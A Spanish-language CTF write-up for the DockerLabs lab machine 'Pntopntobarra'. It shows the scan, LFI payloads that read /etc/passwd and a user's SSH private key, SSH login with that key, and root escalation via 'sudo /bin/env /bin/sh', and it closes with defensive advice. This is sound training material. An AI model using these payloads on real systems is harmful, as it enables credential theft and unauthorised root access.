# Pntopntobarra — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** maciiii__  
**Fecha de creación:** 19/08/2024  
**Técnicas:** LFI · Path Traversal · SSH Key Disclosure · SSH · sudo env abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Explotación LFI — lectura de archivos](#2-explotación-lfi--lectura-de-archivos)
3. [Obtención de clave privada SSH](#3-obtención-de-clave-privada-ssh)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh pntopntobarra.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo completo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

---

## 2. Explotación LFI — lectura de archivos

Inspeccionamos el código fuente de la página web.

Encontramos el siguiente parámetro:

```text
ejemplos.php?images=
```

Probamos una ruta inexistente:

```text
http://172.17.0.2/ejemplos.php?images=../ejemplo1.png
```

La respuesta indica:

```text
Error: El archivo no existe.
```

El parámetro parece vulnerable a **Local File Inclusion (LFI)**.

Leemos `/etc/passwd`:

```text
http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

Resultado:

```text
nico:x:1000:1000::/home/nico:/bin/bash
```

---

## 3. Obtención de clave privada SSH

Intentamos leer la clave privada SSH del usuario.

Payload:

```text
http://172.17.0.2/ejemplos.php?images=/home/nico/.ssh/id_rsa
```

Obtenemos una clave privada OpenSSH completa.

La guardamos localmente:

```bash
nano id_rsa
```

Asignamos permisos correctos:

```bash
chmod 600 id_rsa
```

---

## 4. Acceso SSH

Accedemos utilizando la clave privada:

```bash
ssh -i id_rsa nico@172.17.0.2
```

Acceso correcto.

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /bin/env
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para `env`.

Ejecutamos:

```bash
sudo /bin/env /bin/sh
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Local File Inclusion | Lectura arbitraria de archivos |
| Exposición de clave privada SSH | Acceso remoto |
| sudo sobre env | Escalada inmediata a root |

**Para defenderse:**

- Validar correctamente rutas y parámetros.
- Restringir acceso a archivos sensibles.
- Proteger claves privadas SSH.
- Evitar binarios peligrosos ejecutables mediante sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
